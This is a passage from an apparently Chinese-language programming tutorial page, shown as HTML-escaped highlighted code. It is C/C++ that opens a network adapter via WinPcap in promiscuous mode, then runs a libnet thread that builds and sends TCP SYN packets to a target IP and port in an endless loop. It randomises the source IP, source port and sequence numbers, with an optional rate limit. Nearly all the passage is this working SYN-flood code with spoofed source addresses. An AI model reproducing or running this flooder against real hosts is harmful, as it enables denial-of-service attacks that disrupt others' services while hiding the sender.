class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;\nNo interfaces found! Make sure WinPcap is installed.\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Choose the interface (1-%d):&quot;&lt;/span&gt;,i);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	scanf_s(&lt;span class=&quot;string&quot;&gt;&quot;%d&quot;&lt;/span&gt;, &amp;amp;inum);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inum &amp;lt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; || inum &amp;gt; i)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;\nInterface number out of range.\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pcap_freealldevs(alldevs);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;/* Jump to the selected adapter */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(d = alldevs, i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; inum-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; ; d = d-&amp;gt;next, i++);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((*handle= pcap_open_live(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		d-&amp;gt;name,	&lt;span class=&quot;comment&quot;&gt;// name of the device&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;number&quot;&gt;65536&lt;/span&gt;,		&lt;span class=&quot;comment&quot;&gt;// portion of the packet to capture. &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;comment&quot;&gt;// 65536 grants that the whole packet will be captured on all the MACs.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		PCAP_OPENFLAG_PROMISCUOUS,				&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;comment&quot;&gt;// promiscuous mode (nonzero means promiscuous)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;,		&lt;span class=&quot;comment&quot;&gt;// read timeout&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		errbuf		&lt;span class=&quot;comment&quot;&gt;// error buffer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		)) == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;fprintf&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;stderr&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;\nUnable to open the adapter. %s is not supported by WinPcap\n&quot;&lt;/span&gt;, d-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pcap_freealldevs(alldevs);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	strcpy_s(name,d-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Successfully Open the adapter &amp;lt;%s&amp;gt; \n&quot;&lt;/span&gt;, d-&amp;gt;description);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; TRUE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;发送线程函数&quot;&gt;&lt;a href=&quot;#发送线程函数&quot; class=&quot;headerlink&quot; title=&quot;发送线程函数&quot;&gt;&lt;/a&gt;发送线程函数&lt;/h1&gt;&lt;p&gt;此函数用于构造并发送 SYN 数据包：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;根据用户指定参数生成的 speed 的不同，默认全速发送（speed = 0），否则根据 speed 的值在每次发送后延时&lt;/li&gt;
&lt;li&gt;构造的 SYN 包中，IP 包中的源 IP 和 TCP 包头中的源端口均为随机数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;libnet_write&lt;/code&gt; 用于发送数据包&lt;/li&gt;
&lt;li&gt;&lt;code&gt;l&lt;/code&gt; 是 &lt;code&gt;libnet&lt;/code&gt; 中的上下文&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; __&lt;span class=&quot;function&quot;&gt;stdcall &lt;span class=&quot;title&quot;&gt;send_syn&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(PVOID argv)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; timeval r;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; timeval s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; timeval e;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;libnet_ptag_t&lt;/span&gt; t = LIBNET_PTAG_INITIALIZER;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;u_int32_t&lt;/span&gt; src_ip;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; errbuf[LIBNET_ERRBUF_SIZE];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	u_short src_prt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;libnet_t&lt;/span&gt; *l = libnet_init(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			LIBNET_RAW4,                     &lt;span class=&quot;comment&quot;&gt;/* injection type */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			name,                            &lt;span class=&quot;comment&quot;&gt;/* network interface */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			errbuf);                         &lt;span class=&quot;comment&quot;&gt;/* errbuf */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (l == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;fprintf&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;stderr&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;libnet_init() failed: %s&quot;&lt;/span&gt;, errbuf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    libnet_seed_prand(l);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(speed == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            t = libnet_build_tcp(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    src_prt = libnet_get_prand(LIBNET_PRu16),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    dst_prt,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    libnet_get_prand(LIBNET_PRu32), &lt;span class=&quot;comment&quot;&gt;// sequence number&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,								&lt;span class=&quot;comment&quot;&gt;// acknowledgement num&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    TH_SYN,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    libnet_get_prand(LIBNET_PRu16), &lt;span class=&quot;comment&quot;&gt;// window size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    LIBNET_TCP_H,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    l,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			libnet_build_ipv4(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                LIBNET_TCP_H + LIBNET_IPV4_H,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                libnet_get_prand(LIBNET_PRu16),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                libnet_get_prand(LIBNET_PR8),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                IPPROTO_TCP,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				src_ip = libnet_get_prand(LIBNET_PRu32), &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                dst_ip,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                l,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; c = libnet_write(l);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (c == -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;fprintf&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;stderr&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;libnet_write: %s\n&quot;&lt;/span&gt;, libnet_geterror(l));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            libnet_clear_packet(l);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			gettimeofday(&amp;amp;s, &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; speed; i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				t = libnet_build_tcp(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						src_prt = libnet_get_prand(LIBNET_PRu16),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						dst_prt,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						libnet_get_prand(LIBNET_PRu32), &lt;span class=&quot;comment&quot;&gt;// sequence number&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,                              &lt;span class=&quot;comment&quot;&gt;// acknowledgement num&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						TH_SYN,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						libnet_get_prand(LIBNET_PRu16), &lt;span class=&quot;comment&quot;&gt;// window size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						LIBNET_TCP_H,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						&lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						l,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						t);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				libnet_build_ipv4(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					LIBNET_TCP_H + LIBNET_IPV4_H,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					libnet_get_prand(LIBNET_PRu16),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					libnet_get_prand(LIBNET_PR8),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					IPPROTO_TCP,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					src_ip = libnet_get_prand(LIBNET_PRu32), &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					dst_ip,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					l,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; c = libnet_write(l);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (c == -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;built_in&quot;&gt;fprintf&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;stderr&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;libnet_write: %s\n&quot;&lt;/span&gt;, libnet_geterror(l));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				libnet_clear_packet(l);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			gettimeofday(&amp;amp;e, &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			libnet_timersub(&amp;amp;e, &amp;amp;s, &amp;amp;r);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span 